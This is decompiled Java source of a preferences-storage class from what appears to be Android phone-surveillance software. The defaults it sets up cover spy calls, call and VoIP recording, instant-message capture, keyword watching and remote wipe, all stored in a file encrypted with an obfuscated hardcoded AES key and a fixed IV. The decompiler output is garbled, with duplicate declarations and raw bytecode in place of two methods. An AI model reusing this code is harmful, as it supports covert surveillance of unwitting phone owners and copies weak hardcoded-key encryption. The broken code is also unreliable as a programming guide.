package com.vvt.preference;

import com.vvt.base.FxDeliveryMethod;
import java.io.File;
import java.security.Key;
import java.security.spec.AlgorithmParameterSpec;
import java.util.HashMap;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class b
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private FxPreferenceList c;
  private String d;
  
  public b(String paramString)
  {
    this.d = paramString;
  }
  
  private Cipher a(int paramInt)
  {
    int i = 16;
    Object localObject1 = new int[14];
    Object tmp9_8 = localObject1;
    Object tmp10_9 = tmp9_8;
    Object tmp10_9 = tmp9_8;
    tmp10_9[0] = 100;
    tmp10_9[1] = 111;
    Object tmp19_10 = tmp10_9;
    Object tmp19_10 = tmp10_9;
    tmp19_10[2] = 100;
    tmp19_10[3] = 97;
    Object tmp28_19 = tmp19_10;
    Object tmp28_19 = tmp19_10;
    tmp28_19[4] = 97;
    tmp28_19[5] = 110;
    Object tmp37_28 = tmp28_19;
    Object tmp37_28 = tmp28_19;
    tmp37_28[6] = 116;
    tmp37_28[7] = 100;
    Object tmp48_37 = tmp37_28;
    Object tmp48_37 = tmp37_28;
    tmp48_37[8] = 111;
    tmp48_37[9] = 100;
    Object tmp59_48 = tmp48_37;
    Object tmp59_48 = tmp48_37;
    tmp59_48[10] = 97;
    tmp59_48[11] = 97;
    tmp59_48[12] = 110;
    tmp59_48[13] = 116;
    localObject1 = com.vvt.ag.b.a((int[])localObject1);
    Object localObject2 = new byte[i];
    Object localObject3 = ((String)localObject1).getBytes("UTF-8");
    int j = localObject3.length;
    int k = localObject2.length;
    if (j <= k)
    {
      j = localObject3.length;
      System.arraycopy(localObject3, 0, localObject2, 0, j);
      localObject1 = new javax/crypto/spec/SecretKeySpec;
      localObject3 = "AES";
      ((SecretKeySpec)localObject1).<init>((byte[])localObject2, (String)localObject3);
      int m = 2;
      if (paramInt != m) {
        break label292;
      }
    }
    label292:
    for (localObject2 = "DECRYPT_MODE";; localObject2 = "ENCRYPT_MODE")
    {
      boolean bool = a;
      if (bool) {}
      localObject2 = new byte[i];
      tmp177_175 = localObject2;
      tmp178_177 = tmp177_175;
      tmp178_177 = tmp177_175;
      tmp178_177[0] = 0;
      tmp178_177[1] = 1;
      tmp185_178 = tmp178_177;
      tmp185_178 = tmp178_177;
      tmp185_178[2] = 2;
      tmp185_178[3] = 3;
      tmp192_185 = tmp185_178;
      tmp192_185 = tmp185_178;
      tmp192_185[4] = 4;
      tmp192_185[5] = 5;
      tmp199_192 = tmp192_185;
      tmp199_192 = tmp192_185;
      tmp199_192[6] = 6;
      tmp199_192[7] = 7;
      tmp210_199 = tmp199_192;
      tmp210_199 = tmp199_192;
      tmp210_199[8] = 8;
      tmp210_199[9] = 9;
      tmp221_210 = tmp210_199;
      tmp221_210 = tmp210_199;
      tmp221_210[10] = 10;
      tmp221_210[11] = 11;
      tmp232_221 = tmp221_210;
      tmp232_221 = tmp221_210;
      tmp232_221[12] = 12;
      tmp232_221[13] = 13;
      tmp232_221[14] = 14;
      tmp232_221[15] = 15;
      localObject3 = new javax/crypto/spec/IvParameterSpec;
      ((IvParameterSpec)localObject3).<init>((byte[])localObject2);
      localObject2 = Cipher.getInstance("AES/CFB/NoPadding");
      ((Cipher)localObject2).init(paramInt, (Key)localObject1, (AlgorithmParameterSpec)localObject3);
      return (Cipher)localObject2;
      j = localObject2.length;
      break;
    }
  }
  
  private a b(FxPreferenceType paramFxPreferenceType)
  {
    Object localObject = null;
    int[] arrayOfInt = c.a;
    int i = paramFxPreferenceType.ordinal();
    int j = arrayOfInt[i];
    switch (j)
    {
    default: 
      boolean bool = a;
      if (!bool) {
        break;
      }
    }
    for (;;)
    {
      return (a)localObject;
      localObject = new com/vvt/preference/PrefAddressBook;
      ((PrefAddressBook)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefAppProfile;
      ((PrefAppProfile)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefCallRecordingAudioSource;
      ((PrefCallRecordingAudioSource)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefCallRecordingWatchFlag;
      ((PrefCallRecordingWatchFlag)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefCallRecordingWatchNumber;
      ((PrefCallRecordingWatchNumber)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefCISNumber;
      ((PrefCISNumber)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefDeviceLock;
      ((PrefDeviceLock)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefEmergencyNumber;
      ((PrefEmergencyNumber)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefEventsCapture;
      ((PrefEventsCapture)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefHomeNumber;
      ((PrefHomeNumber)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefKeyword;
      ((PrefKeyword)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefMediaHistorical;
      ((PrefMediaHistorical)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefMonitorNumber;
      ((PrefMonitorNumber)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefNotificationMessage;
      ((PrefNotificationMessage)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefNotificationNumber;
      ((PrefNotificationNumber)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefPanic;
      ((PrefPanic)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefRestriction;
      ((PrefRestriction)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefSpyCall;
      ((PrefSpyCall)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefUrlProfile;
      ((PrefUrlProfile)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefWatchList;
      ((PrefWatchList)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefWipe;
      ((PrefWipe)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefTemporalControl;
      ((PrefTemporalControl)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefIMCaptureSettings;
      ((PrefIMCaptureSettings)localObject).<init>();
      continue;
      localObject = new com/vvt/preference/PrefVoipCallRecordingCaptureSettings;
      ((PrefVoipCallRecordingCaptureSettings)localObject).<init>();
    }
  }
  
  private void f()
  {
    boolean bool1 = false;
    Object localObject = null;
    int i = a;
    if (i != 0) {}
    FxPreferenceList localFxPreferenceList = this.c;
    if (localFxPreferenceList != null)
    {
      HashMap localHashMap = this.c.getPreferences();
      FxPreferenceType[] arrayOfFxPreferenceType = FxPreferenceType.values();
      int k = arrayOfFxPreferenceType.length;
      i = 0;
      localFxPreferenceList = null;
      if (i < k)
      {
        FxPreferenceType localFxPreferenceType = arrayOfFxPreferenceType[i];
        boolean bool2 = localHashMap.containsKey(localFxPreferenceType);
        if (bool2)
        {
          boolean bool3 = a;
          if (!bool3) {}
        }
        for (;;)
        {
          int j;
          i += 1;
          break;
          localObject = b(localFxPreferenceType);
          if (localObject != null)
          {
            bool2 = a;
            if (bool2) {}
            localHashMap.put(localFxPreferenceType, localObject);
          }
          bool1 = true;
        }
      }
      if (bool1)
      {
        bool1 = a;
        if (bool1) {}
        this.c.setPreferences(localHashMap);
        localObject = this.c;
        a((FxPreferenceList)localObject);
      }
    }
    bool1 = a;
    if (bool1) {}
  }
  
  public a a(FxPreferenceType paramFxPreferenceType)
  {
    Object localObject1 = null;
    synchronized (this.c)
    {
      Object localObject2 = this.c;
      localObject2 = ((FxPreferenceList)localObject2).getPreferences();
      if (localObject2 != null)
      {
        boolean bool = ((HashMap)localObject2).containsKey(paramFxPreferenceType);
        if (bool)
        {
          localObject1 = ((HashMap)localObject2).get(paramFxPreferenceType);
          localObject1 = (a)localObject1;
        }
      }
      if (localObject1 == null)
      {
        localObject1 = new com/vvt/preference/FxPreferenceException;
        ((FxPreferenceException)localObject1).<init>("Specified preference is missing");
        throw ((Throwable)localObject1);
      }
    }
    return locala;
  }
  
  public void a()
  {
    bool = a;
    if (bool) {}
    this.c = null;
    Object localObject1 = new java/io/File;
    String str1 = this.d;
    String str2 = "preferences.dat";
    ((File)localObject1).<init>(str1, str2);
    bool = ((File)localObject1).exists();
    if (bool) {}
    try
    {
      localObject1 = d();
      this.c = ((FxPreferenceList)localObject1);
      bool = a;
      if (bool) {}
      f();
    }
    finally
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    localObject1 = this.c;
    if (localObject1 == null)
    {
      bool = a;
      if (bool) {}
      localObject1 = e();
      this.c = ((FxPreferenceList)localObject1);
      bool = a;
      if (bool) {}
      localObject1 = this.c;
      a((FxPreferenceList)localObject1);
    }
    bool = a;
    if (bool) {}
  }
  
  /* Error */
  void a(FxPreferenceList paramFxPreferenceList)
  {
    // Byte code:
    //   0: iconst_1
    //   1: istore_2
    //   2: new 208	java/io/File
    //   5: astore_3
    //   6: aload_0
    //   7: getfield 27	com/vvt/preference/removeFromPath:d	Ljava/lang/String;
    //   10: astore 4
    //   12: ldc -46
    //   14: astore 5
    //   16: aload_3
    //   17: aload 4
    //   19: aload 5
    //   21: invokespecial 213	java/io/File:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   24: aload_3
    //   25: invokevirtual 217	java/io/File:exists	()Z
    //   28: istore 6
    //   30: iload 6
    //   32: ifeq +8 -> 40
    //   35: aload_3
    //   36: invokevirtual 228	java/io/File:delete	()Z
    //   39: pop
    //   40: iconst_0
    //   41: istore 7
    //   43: aconst_null
    //   44: astore 5
    //   46: iconst_1
    //   47: istore 6
    //   49: aload_0
    //   50: iload 6
    //   52: invokespecial 231	com/vvt/preference/removeFromPath:a	(I)Ljavax/crypto/Cipher;
    //   55: astore 8
    //   57: new 233	java/io/ObjectOutputStream
    //   60: astore 4
    //   62: new 235	javax/crypto/CipherOutputStream
    //   65: astore 9
    //   67: new 237	java/io/BufferedOutputStream
    //   70: astore 10
    //   72: new 239	java/io/FileOutputStream
    //   75: astore 11
    //   77: aload 11
    //   79: aload_3
    //   80: invokespecial 242	java/io/FileOutputStream:<init>	(Ljava/io/File;)V
    //   83: aload 10
    //   85: aload 11
    //   87: invokespecial 245	java/io/BufferedOutputStream:<init>	(Ljava/io/OutputStream;)V
    //   90: aload 9
    //   92: aload 10
    //   94: aload 8
    //   96: invokespecial 248	javax/crypto/CipherOutputStream:<init>	(Ljava/io/OutputStream;Ljavax/crypto/Cipher;)V
    //   99: aload 4
    //   101: aload 9
    //   103: invokespecial 249	java/io/ObjectOutputStream:<init>	(Ljava/io/OutputStream;)V
    //   106: aload 4
    //   108: aload_1
    //   109: invokevirtual 253	java/io/ObjectOutputStream:writeObject	(Ljava/lang/Object;)V
    //   112: aload 4
    //   114: invokevirtual 256	java/io/ObjectOutputStream:flush	()V
    //   117: aload 4
    //   119: ifnull +8 -> 127
    //   122: aload 4
    //   124: invokevirtual 259	java/io/ObjectOutputStream:close	()V
    //   127: iconst_0
    //   128: istore 6
    //   130: aconst_null
    //   131: astore 4
    //   133: iload 6
    //   135: ifeq +66 -> 201
    //   138: new 201	com/vvt/preference/FxPreferenceException
    //   141: astore 4
    //   143: aload 4
    //   145: ldc_w 261
    //   148: invokespecial 206	com/vvt/preference/FxPreferenceException:<init>	(Ljava/lang/String;)V
    //   151: aload 4
    //   153: athrow
    //   154: astore 4
    //   156: iconst_0
    //   157: istore 6
    //   159: aconst_null
    //   160: astore 4
    //   162: getstatic 21	com/vvt/preference/removeFromPath:removeFromPath	Z
    //   165: istore 7
    //   167: iload 7
    //   169: ifeq +3 -> 172
    //   172: aload 4
    //   174: ifnull +8 -> 182
    //   177: aload 4
    //   179: invokevirtual 259	java/io/ObjectOutputStream:close	()V
    //   182: iload_2
    //   183: istore 6
    //   185: goto -52 -> 133
    //   188: aload 5
    //   190: ifnull +8 -> 198
    //   193: aload 5
    //   195: invokevirtual 259	java/io/ObjectOutputStream:close	()V
    //   198: aload 4
    //   200: athrow
    //   201: return
    //   202: astore 5
    //   204: goto -6 -> 198
    //   207: astore 4
    //   209: goto -27 -> 182
    //   212: astore 4
    //   214: goto -87 -> 127
    //   217: astore 12
    //   219: aload 4
    //   221: astore 5
    //   223: aload 12
    //   225: astore 4
    //   227: goto -39 -> 188
    //   230: astore 5
    //   232: goto -70 -> 162
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	235	0	this	removeFromPath
    //   0	235	1	paramFxPreferenceList	FxPreferenceList
    //   1	182	2	i	int
    //   5	75	3	localFile	File
    //   10	142	4	localObject1	Object
    //   154	1	4	localObject2	Object
    //   160	39	4	localObject3	Object
    //   207	1	4	localIOException1	java.io.IOException
    //   212	8	4	localIOException2	java.io.IOException
    //   225	1	4	localObject4	Object
    //   14	180	5	str	String
    //   202	1	5	localIOException3	java.io.IOException
    //   221	1	5	localIOException4	java.io.IOException
    //   230	1	5	localObject5	Object
    //   28	23	6	j	int
    //   128	56	6	k	int
    //   41	127	7	bool	boolean
    //   55	40	8	localCipher	Cipher
    //   65	37	9	localCipherOutputStream	javax.crypto.CipherOutputStream
    //   70	23	10	localBufferedOutputStream	java.io.BufferedOutputStream
    //   75	11	11	localFileOutputStream	java.io.FileOutputStream
    //   217	7	12	localObject6	Object
    // Exception table:
    //   from	to	target	type
    //   50	55	154	finally
    //   57	60	154	finally
    //   62	65	154	finally
    //   67	70	154	finally
    //   72	75	154	finally
    //   79	83	154	finally
    //   85	90	154	finally
    //   94	99	154	finally
    //   101	106	154	finally
    //   193	198	202	java/io/IOException
    //   177	182	207	java/io/IOException
    //   122	127	212	java/io/IOException
    //   162	165	217	finally
    //   108	112	230	finally
    //   112	117	230	finally
  }
  
  public void b()
  {
    FxPreferenceList localFxPreferenceList = this.c;
    a(localFxPreferenceList);
    boolean bool = a;
    if (bool) {}
  }
  
  public void c()
  {
    boolean bool1 = a;
    if (bool1) {}
    synchronized (this.c)
    {
      Object localObject2 = this.c;
      localObject2 = ((FxPreferenceList)localObject2).getPreferences();
      boolean bool2 = a;
      if (bool2) {}
      ((HashMap)localObject2).clear();
      bool1 = a;
      if (bool1) {}
      localObject2 = new java/io/File;
      ??? = this.d;
      String str = "preferences.dat";
      ((File)localObject2).<init>((String)???, str);
      boolean bool3 = ((File)localObject2).exists();
      if (bool3) {
        ((File)localObject2).delete();
      }
      bool1 = a;
      if (bool1) {}
      a();
      bool1 = a;
      if (bool1) {}
      return;
    }
  }
  
  /* Error */
  FxPreferenceList d()
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: new 208	java/io/File
    //   5: astore_2
    //   6: aload_0
    //   7: getfield 27	com/vvt/preference/removeFromPath:d	Ljava/lang/String;
    //   10: astore_3
    //   11: ldc -46
    //   13: astore 4
    //   15: aload_2
    //   16: aload_3
    //   17: aload 4
    //   19: invokespecial 213	java/io/File:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   22: aload_2
    //   23: invokevirtual 217	java/io/File:exists	()Z
    //   26: istore 5
    //   28: iload 5
    //   30: ifeq +93 -> 123
    //   33: iconst_2
    //   34: istore 5
    //   36: aload_0
    //   37: iload 5
    //   39: invokespecial 231	com/vvt/preference/removeFromPath:a	(I)Ljavax/crypto/Cipher;
    //   42: astore 4
    //   44: new 270	java/io/ObjectInputStream
    //   47: astore_3
    //   48: new 272	javax/crypto/CipherInputStream
    //   51: astore 6
    //   53: new 274	java/io/BufferedInputStream
    //   56: astore 7
    //   58: new 276	java/io/FileInputStream
    //   61: astore 8
    //   63: aload_2
    //   64: invokevirtual 280	java/io/File:getPath	()Ljava/lang/String;
    //   67: astore_2
    //   68: aload 8
    //   70: aload_2
    //   71: invokespecial 281	java/io/FileInputStream:<init>	(Ljava/lang/String;)V
    //   74: aload 7
    //   76: aload 8
    //   78: invokespecial 284	java/io/BufferedInputStream:<init>	(Ljava/io/InputStream;)V
    //   81: aload 6
    //   83: aload 7
    //   85: aload 4
    //   87: invokespecial 287	javax/crypto/CipherInputStream:<init>	(Ljava/io/InputStream;Ljavax/crypto/Cipher;)V
    //   90: aload_3
    //   91: aload 6
    //   93: invokespecial 288	java/io/ObjectInputStream:<init>	(Ljava/io/InputStream;)V
    //   96: aload_3
    //   97: invokevirtual 292	java/io/ObjectInputStream:readObject	()Ljava/lang/Object;
    //   100: astore_2
    //   101: aload_2
    //   102: instanceof 164
    //   105: istore 9
    //   107: iload 9
    //   109: ifeq +80 -> 189
    //   112: aload_2
    //   113: checkcast 164	com/vvt/preference/FxPreferenceList
    //   116: astore_2
    //   117: aload_3
    //   118: invokestatic 297	com/vvt/io/d:a	(Ljava/io/ObjectInputStream;)V
    //   121: aload_2
    //   122: astore_1
    //   123: aload_1
    //   124: ifnonnull +43 -> 167
    //   127: new 201	com/vvt/preference/FxPreferenceException
    //   130: astore_2
    //   131: aload_2
    //   132: ldc_w 299
    //   135: invokespecial 206	com/vvt/preference/FxPreferenceException:<init>	(Ljava/lang/String;)V
    //   138: aload_2
    //   139: athrow
    //   140: astore_2
    //   141: aconst_null
    //   142: astore_2
    //   143: getstatic 21	com/vvt/preference/removeFromPath:removeFromPath	Z
    //   146: istore 5
    //   148: iload 5
    //   150: ifeq +3 -> 153
    //   153: aload_2
    //   154: invokestatic 297	com/vvt/io/d:a	(Ljava/io/ObjectInputStream;)V
    //   157: goto -34 -> 123
    //   160: astore_2
    //   161: aload_1
    //   162: invokestatic 297	com/vvt/io/d:a	(Ljava/io/ObjectInputStream;)V
    //   165: aload_2
    //   166: athrow
    //   167: aload_1
    //   168: areturn
    //   169: astore_2
    //   170: aload_3
    //   171: astore_1
    //   172: goto -11 -> 161
    //   175: astore_3
    //   176: aload_2
    //   177: astore_1
    //   178: aload_3
    //   179: astore_2
    //   180: goto -19 -> 161
    //   183: astore_2
    //   184: aload_3
    //   185: astore_2
    //   186: goto -43 -> 143
    //   189: aconst_null
    //   190: astore_2
    //   191: goto -74 -> 117
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	194	0	this	removeFromPath
    //   1	177	1	localObject1	Object
    //   5	134	2	localObject2	Object
    //   140	1	2	localException1	Exception
    //   142	12	2	localObjectInputStream	java.io.ObjectInputStream
    //   160	6	2	localObject3	Object
    //   169	8	2	localObject4	Object
    //   179	1	2	localObject5	Object
    //   183	1	2	localException2	Exception
    //   185	6	2	localObject6	Object
    //   10	161	3	localObject7	Object
    //   175	10	3	localObject8	Object
    //   13	73	4	localObject9	Object
    //   26	3	5	bool1	boolean
    //   34	4	5	i	int
    //   146	3	5	bool2	boolean
    //   51	41	6	localCipherInputStream	javax.crypto.CipherInputStream
    //   56	28	7	localBufferedInputStream	java.io.BufferedInputStream
    //   61	16	8	localFileInputStream	java.io.FileInputStream
    //   105	3	9	bool3	boolean
    // Exception table:
    //   from	to	target	type
    //   37	42	140	java/lang/Exception
    //   44	47	140	java/lang/Exception
    //   48	51	140	java/lang/Exception
    //   53	56	140	java/lang/Exception
    //   58	61	140	java/lang/Exception
    //   63	67	140	java/lang/Exception
    //   70	74	140	java/lang/Exception
    //   76	81	140	java/lang/Exception
    //   85	90	140	java/lang/Exception
    //   91	96	140	java/lang/Exception
    //   37	42	160	finally
    //   44	47	160	finally
    //   48	51	160	finally
    //   53	56	160	finally
    //   58	61	160	finally
    //   63	67	160	finally
    //   70	74	160	finally
    //   76	81	160	finally
    //   85	90	160	finally
    //   91	96	160	finally
    //   96	100	169	finally
    //   112	116	169	finally
    //   143	146	175	finally
    //   96	100	183	java/lang/Exception
    //   112	116	183	java/lang/Exception
  }
  
  FxPreferenceList e()
  {
    int i = 1;
    boolean bool1 = a;
    if (bool1) {}
    HashMap localHashMap = new java/util/HashMap;
    localHashMap.<init>();
    Object localObject1 = FxPreferenceType.ADDRESSBOOK;
    Object localObject2 = FxPreferenceType.ADDRESSBOOK;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    localObject1 = FxPreferenceType.APP_PROFILE;
    localObject2 = FxPreferenceType.APP_PROFILE;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    localObject1 = FxPreferenceType.CIS_NUMBER;
    localObject2 = FxPreferenceType.CIS_NUMBER;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    localObject1 = FxPreferenceType.DEVICE_LOCK;
    localObject2 = FxPreferenceType.DEVICE_LOCK;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    localObject1 = FxPreferenceType.EMERGENCY_NUMBER;
    localObject2 = FxPreferenceType.EMERGENCY_NUMBER;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    bool1 = a;
    if (bool1) {}
    localObject1 = FxPreferenceType.EVENTS_CTRL;
    localObject1 = (PrefEventsCapture)b((FxPreferenceType)localObject1);
    ((PrefEventsCapture)localObject1).setCaptureEnabled(i);
    localObject2 = FxDeliveryMethod.ANY_AVAILABLE;
    ((PrefEventsCapture)localObject1).setDeliveryMethod((FxDeliveryMethod)localObject2);
    ((PrefEventsCapture)localObject1).setDeliverTimer(i);
    int j = 10;
    ((PrefEventsCapture)localObject1).setTriggerNumber(j);
    localObject2 = FxPreferenceType.EVENTS_CTRL;
    localHashMap.put(localObject2, localObject1);
    localObject1 = FxPreferenceType.HOME_NUMBER;
    localObject2 = FxPreferenceType.HOME_NUMBER;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    localObject1 = FxPreferenceType.KEYWORD;
    localObject2 = FxPreferenceType.KEYWORD;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    localObject1 = FxPreferenceType.MONITOR_NUMBER;
    localObject2 = FxPreferenceType.MONITOR_NUMBER;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    localObject1 = FxPreferenceType.NOTIFICATION_MESSAGES;
    localObject2 = FxPreferenceType.NOTIFICATION_MESSAGES;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    localObject1 = FxPreferenceType.NOTIFICATION_NUMBER;
    localObject2 = FxPreferenceType.NOTIFICATION_NUMBER;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    localObject1 = FxPreferenceType.PANIC;
    localObject2 = FxPreferenceType.PANIC;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    localObject1 = FxPreferenceType.RESTRICTION;
    localObject2 = FxPreferenceType.RESTRICTION;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    localObject1 = FxPreferenceType.SPY_CALL;
    localObject2 = FxPreferenceType.SPY_CALL;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    localObject1 = FxPreferenceType.URL_PROFILE;
    localObject2 = FxPreferenceType.URL_PROFILE;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    localObject1 = FxPreferenceType.WATCH_LIST;
    localObject2 = FxPreferenceType.WATCH_LIST;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    localObject1 = FxPreferenceType.WIPE;
    localObject2 = FxPreferenceType.WIPE;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    localObject1 = FxPreferenceType.MEDIA_HISTORICAL;
    localObject2 = FxPreferenceType.MEDIA_HISTORICAL;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    localObject1 = FxPreferenceType.CALL_RECORDING_WATCH_NUMBER;
    localObject2 = FxPreferenceType.CALL_RECORDING_WATCH_NUMBER;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    localObject1 = FxPreferenceType.CALL_RECORDING_WATCH_FLAG;
    localObject2 = FxPreferenceType.CALL_RECORDING_WATCH_FLAG;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    localObject1 = FxPreferenceType.CALL_RECORDING_AUDIO_SOURCE;
    localObject2 = FxPreferenceType.CALL_RECORDING_AUDIO_SOURCE;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    localObject1 = FxPreferenceType.TEMPORAL_CONTROL;
    localObject2 = FxPreferenceType.TEMPORAL_CONTROL;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    localObject1 = FxPreferenceType.IM_CAPTURE_SETTINGS;
    localObject2 = FxPreferenceType.IM_CAPTURE_SETTINGS;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    localObject1 = FxPreferenceType.VOIP_CALLRECORDING_CAPTURE_SETTINGS;
    localObject2 = FxPreferenceType.VOIP_CALLRECORDING_CAPTURE_SETTINGS;
    localObject2 = b((FxPreferenceType)localObject2);
    localHashMap.put(localObject1, localObject2);
    localObject1 = new com/vvt/preference/FxPreferenceList;
    ((FxPreferenceList)localObject1).<init>();
    ((FxPreferenceList)localObject1).setPreferences(localHashMap);
    boolean bool2 = a;
    if (bool2) {}
    return (FxPreferenceList)localObject1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/preference/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */